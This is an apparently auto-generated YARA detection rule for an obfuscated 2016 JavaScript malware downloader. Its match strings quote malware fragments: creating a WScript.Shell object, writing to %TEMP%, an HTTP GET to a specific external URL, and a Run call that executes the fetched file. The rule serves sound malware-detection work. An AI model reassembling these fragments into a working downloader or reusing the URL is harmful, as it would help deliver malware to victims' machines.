rule sig_20160427_ae77e210c0f6b3596c3fa8da66bd7217 {
  meta:
    description = "datamaliciousorder - file 20160427_ae77e210c0f6b3596c3fa8da66bd7217.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8ae8c365d78d74328177011eed73fdfd144f224cd8e61fe579a71cc0908b0b8e"

  strings:
    $s1  = "function AdzvyUhqxe(NkmmbBiniz, NuuqsTlyje){GvshcJtawr = GvshcJtawr * 1; return NkmmbBiniz - NuuqsTlyje;};" fullword ascii
    $s2  = "function IlgvzBybps() {return TqbmjMeesa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"IfX2L6o" ascii
    $s3  = "function IlgvzBybps() {return TqbmjMeesa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"IfX2L6o" ascii
    $s4  = "var TqbmjMeesa = function AlwzpWfmpd() {return VcjhyYvqoa[EzdgnSkyam](\"WScript\"+\".Shell\");}(), MfcofDlwqc = 11;" fullword ascii
    $s5  = "SnvmmKnmoc[IdjktCpndz](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "var VcjhyYvqoa = this[\"WScript\"];" fullword ascii
    $s7  = "function VafhqMddcw(){return RwwbyJhxpx + \"\";};" fullword ascii
    $s8  = "if (SnvmmKnmoc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function FeriqEvrdh() {return ((KgziiKwsxy == true) && (KgziiKwsxy == FsvmgVavly)) ? 1 : GvshcJtawr;};" fullword ascii
    $s10 = "FsvmgVavly = true; " fullword ascii
    $s11 = "KgziiKwsxy = true; " fullword ascii
    $s12 = "var KgziiKwsxy = false;" fullword ascii
    $s13 = "function IvlfoEgaow()" fullword ascii
    $s14 = "var FsvmgVavly = false;" fullword ascii
    $s15 = "function ZzpkaGvjjn(){return EzdgnSkyam;};" fullword ascii
    $s16 = "var ZsvqiDhswx = false;" fullword ascii
    $s17 = "ZsvqiDhswx = true;" fullword ascii
    $s18 = "return AdzvyUhqxe(SnogcUwifa, EathkNotnt);" fullword ascii
    $s19 = "function GtsktHjqfi(EnfoqTqzzl){TqbmjMeesa[\"R\"+\"un\"](EnfoqTqzzl, GvshcJtawr, GvshcJtawr);};" fullword ascii
    $s20 = "function FdudfBnwdq(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}